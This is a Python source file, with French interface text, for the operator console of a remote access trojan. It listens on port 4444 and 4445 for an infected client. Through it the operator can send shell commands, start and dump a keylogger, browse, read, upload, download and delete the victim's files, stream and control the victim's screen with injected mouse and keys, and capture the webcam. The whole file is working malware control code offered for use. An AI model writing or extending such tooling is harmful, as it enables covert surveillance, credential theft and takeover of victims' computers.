import socket
import threading
import io
import os
import base64
from PIL import Image, ImageTk
import customtkinter as ctk
from tkinter import ttk, filedialog
from tkinter import Menu
from protocol import send_data, receive_data, receive_base64

HOST = "0.0.0.0"
PORT = 4444
PORT_VIDEO = 4445

class StreamingWindow(ctk.CTkToplevel):
    def __init__(self, master, receive_video_func, mouse_move, click_mouse, key_press, right_click, scroll_mouse):
        super().__init__(master)
        self.title("🎥 Streaming")
        self.geometry("960x600")
        self.receive_video_func = receive_video_func
        self.stream_w, self.stream_h = 900, 500

        self.image_label = ctk.CTkLabel(self, text="")
        self.image_label.pack(pady=10)

        self.image_label.bind("<Motion>", mouse_move)
        self.image_label.bind("<Button-1>", click_mouse)
        self.image_label.bind("<Key>", key_press)
        self.image_label.bind("<Button-3>", right_click)
        self.image_label.bind("<MouseWheel>", scroll_mouse)
        self.bind("<Button-1>", lambda e: self.image_label.focus_set())

        threading.Thread(target=self.receive_video_stream, daemon=True).start()

    def receive_video_stream(self):
        while True:
            try:
                data = self.receive_video_func()
                if not data or len(data) < 1000:
                    continue
                img = Image.open(io.BytesIO(data)).resize((self.stream_w, self.stream_h))
                photo = ImageTk.PhotoImage(img)
                self.image_label.configure(image=photo)
                self.image_label.image = photo
            except Exception as e:
                print(f"[Erreur stream] {e}")

class WebcamWindow(ctk.CTkToplevel):
    def __init__(self, master, send_command, receive_base64_func):
        super().__init__(master)
        self.title("Webcam")
        self.geometry("600x450")
        self.send_command = send_command
        self.receive_base64 = receive_base64_func

        self.image_label = ctk.CTkLabel(self, text="")
        self.image_label.pack(pady=10)

        self.capture_btn = ctk.CTkButton(self, text="📸 Capturer Webcam", command=self.capture_webcam)
        self.capture_btn.pack(pady=10)

    def capture_webcam(self):
        self.send_command("webcam")
        data = self.receive_base64()
        try:
            img = Image.open(io.BytesIO(data)).resize((580, 400))
            photo = ImageTk.PhotoImage(img)
            self.image_label.configure(image=photo)
            self.image_label.image = photo
        except Exception as e:
            print(f"[Erreur webcam] {e}")

class ToolsWindow(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Outils")
        self.geometry("850x700")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.client_socket = None
        self.video_socket = None
        self.streaming_window = None
        self.webcam_window = None

        threading.Thread(target=self.wait_for_connection, daemon=True).start()

        self.tabview = ctk.CTkTabview(self)
        self.tabview.pack(expand=True, fill="both", padx=10, pady=10)

        self.shell_tab = self.tabview.add("💬 Shell")
        self.keylogger_tab = self.tabview.add("⌨️ Keylogger")
        self.files_tab = self.tabview.add("📁 Fichiers")
        self.control_tab = self.tabview.add("📺 Contrôle")

        self.setup_shell_tab()
        self.setup_keylogger_tab()
        self.setup_control_tab()

    def log(self, text):
        print(text)

    def wait_for_connection(self):
        self.log("[*] En attente de connexions...")

        sock_cmd = socket.socket()
        sock_cmd.bind((HOST, PORT))
        sock_cmd.listen(1)
        self.client_socket, _ = sock_cmd.accept()
        self.log("[+] Client commandes connecté")

        sock_video = socket.socket()
        sock_video.bind((HOST, PORT_VIDEO))
        sock_video.listen(1)
        self.video_socket, _ = sock_video.accept()
        self.log("[+] Client vidéo connecté")

        self.after(100, self.setup_files_tab)

    def setup_shell_tab(self):
        self.shell_output = ctk.CTkTextbox(self.shell_tab, height=300)
        self.shell_output.pack(pady=10, fill="x")

        self.cmd_entry = ctk.CTkEntry(self.shell_tab, placeholder_text="Commande shell...")
        self.cmd_entry.pack(pady=5, fill="x")
        self.cmd_entry.bind("<Return>", lambda e: self.send_shell())

        ctk.CTkButton(self.shell_tab, text="Exécuter", command=self.send_shell).pack(pady=5)

    def send_shell(self):
        cmd = self.cmd_entry.get()
        if not cmd:
            return
        self.send_command(f"cmd {cmd}")
        output = self.receive_data().decode(errors="ignore")
        self.shell_output.insert("end", f"> {cmd}\n{output}\n")
        self.cmd_entry.delete(0, "end")

    def setup_keylogger_tab(self):
        self.keylog_output = ctk.CTkTextbox(self.keylogger_tab, height=300)
        self.keylog_output.pack(pady=10, fill="x")

        btn_frame = ctk.CTkFrame(self.keylogger_tab)
        btn_frame.pack(pady=5)
        ctk.CTkButton(btn_frame, text="▶️ Démarrer", command=self.start_keylogger).pack(side="left", padx=5)
        ctk.CTkButton(btn_frame, text="📄 Logs", command=self.dump_keylogger).pack(side="left", padx=5)

    def start_keylogger(self):
        self.send_command("keylogger_start")
        self.keylog_output.insert("end", self.receive_data().decode() + "\n")

    def dump_keylogger(self):
        self.send_command("keylogger_dump")
        self.keylog_output.insert("end", self.receive_data().decode() + "\n")

    def setup_files_tab(self):
        self.tree = ttk.Treeview(self.files_tab)
        self.tree.pack(fill="both", expand=True, pady=10, padx=10)
        self.tree.bind("<Double-1>", self.on_item_double_click)
        self.tree.bind("<Button-3>", self.on_right_click)

        self.file_content = ctk.CTkTextbox(self.files_tab, height=150)
        self.file_content.pack(fill="x", padx=10)

        self.metadata_label = ctk.CTkLabel(self.files_tab, text="")
        self.metadata_label.pack(pady=5)

        self.current_opened_file = None

        self.send_command("list_drives")
        drives = self.receive_data().decode().splitlines()
        for drive in drives:
            self.tree.insert("", "end", text=drive, values=[drive], tags=("DIR",))

    def on_item_double_click(self, event):
        selected = self.tree.selection()
        if not selected:
            return
        item = selected[0]
        path = self.tree.item(item, "values")[0]
        item_type = self.tree.item(item, "tags")[0]

        self.send_command(f"metadata {path}")
        metadata = self.receive_data().decode()
        self.metadata_label.configure(text=metadata)

        if item_type == "DIR":
            children = self.tree.get_children(item)
            if children:
                self.tree.delete(*children)
                return
            self.send_command(f"listfiles {path}")
            entries = self.receive_data().decode().splitlines()
            for entry in entries:
                if "|" not in entry:
                    continue
                try:
                    name, entry_type = entry.split("|", 1)
                    full_path = os.path.join(path, name).replace("\\", "/")
                    self.tree.insert(item, "end", text=name, values=[full_path], tags=(entry_type,))
                except Exception as e:
                    self.log(f"[Erreur parsing fichier] {entry} → {e}")
        else:
            self.modify_file(path)

    def on_right_click(self, event):
        try:
            iid = self.tree.identify_row(event.y)
            if iid:
                self.tree.selection_set(iid)
                menu = Menu(self, tearoff=0)
                path = self.tree.item(iid, "values")[0]
                item_type = self.tree.item(iid, "tags")[0]

                if item_type == "FILE":
                    menu.add_command(label="📝 Modifier", command=lambda: self.modify_file(path))
                    menu.add_command(label="📥 Télécharger", command=lambda: self.download_file(path))
                menu.add_command(label="📤 Importer ici", command=lambda: self.upload_file(path))
                menu.add_command(label="🗑️ Supprimer", command=lambda: self.delete_file(path))
                menu.tk_popup(event.x_root, event.y_root)
        except Exception as e:
            self.log(f"[Menu contextuel erreur] {e}")

    def modify_file(self, path):
        if not path.endswith(('.txt', '.py', '.md', '.log')):
            self.log("[!] Fichier non modifiable directement.")
            return
        self.send_command(f"readfile {path}")
        content = receive_data(self.client_socket)
        try:
            decoded = base64.b64decode(content).decode(errors="ignore")
        except:
            decoded = "[Fichier binaire ou invalide]"
        self.file_content.delete("0.0", "end")
        self.file_content.insert("end", decoded)
        self.current_opened_file = path

    def upload_file(self, remote_path):
        file_path = filedialog.askopenfilename()
        if not file_path:
            return
        try:
            with open(file_path, "rb") as f:
                content = base64.b64encode(f.read()).decode()
            if remote_path.endswith("/") or remote_path[-1] in ["/", "\\"]:
                filename = os.path.basename(file_path)
                remote_path = os.path.join(remote_path, filename).replace("\\", "/")
            self.send_command(f"writefile {remote_path}")
            send_data(self.client_socket, content.encode())
            result = self.receive_data().decode()
            self.log(f"[Upload] {result}")
        except Exception as e:
            self.log(f"[Erreur upload] {e}")

    def download_file(self, path):
        self.send_command(f"readfile {path}")
        content = receive_data(self.client_socket)
        try:
            filename = os.path.basename(path)
            os.makedirs("downloads", exist_ok=True)
            local_path = os.path.join("downloads", filename)
            with open(local_path, "wb") as f:
                f.write(base64.b64decode(content))
            self.log(f"[Téléchargé] {filename}")
            os.startfile(local_path)
        except Exception as e:
            self.log(f"Erreur téléchargement: {e}")

    def delete_file(self, path):
        self.send_command(f"deletefile {path}")
        result = self.receive_data().decode()
        self.log(result)
        self.tree.delete(self.tree.selection()[0])

    def setup_control_tab(self):
        ctk.CTkButton(self.control_tab, text="🎥 Ouvrir/Fermer Streaming", command=self.toggle_streaming).pack(pady=10)
        ctk.CTkButton(self.control_tab, text="📷 Ouvrir/Fermer Webcam", command=self.toggle_webcam).pack(pady=10)

    def toggle_streaming(self):
        if self.streaming_window and self.streaming_window.winfo_exists():
            self.streaming_window.destroy()
            self.streaming_window = None
        else:
            self.streaming_window = StreamingWindow(
                self,
                lambda: receive_base64(self.video_socket),
                self.mouse_move,
                self.click_mouse,
                self.key_press,
                self.right_click,
                self.scroll_mouse
            )

    def toggle_webcam(self):
        if self.webcam_window and self.webcam_window.winfo_exists():
            self.webcam_window.destroy()
            self.webcam_window = None
        else:
            self.webcam_window = WebcamWindow(
                self,
                self.send_command,
                lambda: receive_base64(self.client_socket)
            )

    def send_command(self, cmd):
        try:
            self.client_socket.send(cmd.encode())
        except:
            self.log("[-] Échec envoi commande")

    def receive_data(self):
        return receive_data(self.client_socket)

    def mouse_move(self, event):
        x, y = event.x, event.y
        self.send_command(f"mouse_move {x} {y} 900 500")

    def click_mouse(self, event=None):
        self.send_command("click")

    def right_click(self, event):
        self.send_command("right_click")

    def scroll_mouse(self, event):
        self.send_command(f"scroll {event.delta}")

    def key_press(self, event):
        special_keys = {
            "Return": "[enter]", "Tab": "\t", "space": " ", "BackSpace": "\b",
            "Escape": "[esc]", "Delete": "[delete]", "Caps_Lock": "[capslock]",
            "Control_L": "[ctrl]", "Alt_L": "[alt]", "Shift_L": "[shift]",
            "Left": "[left]", "Right": "[right]", "Up": "[up]", "Down": "[down]"
        }
        if event.char:
            self.send_command(f"type {event.char}")
        elif event.keysym in special_keys:
            self.send_command(f"type_special {special_keys[event.keysym]}")
        else:
            self.log(f"[!] Touche inconnue : {event.keysym}")

if __name__ == "__main__":
    app = ToolsWindow()
    app.mainloop()
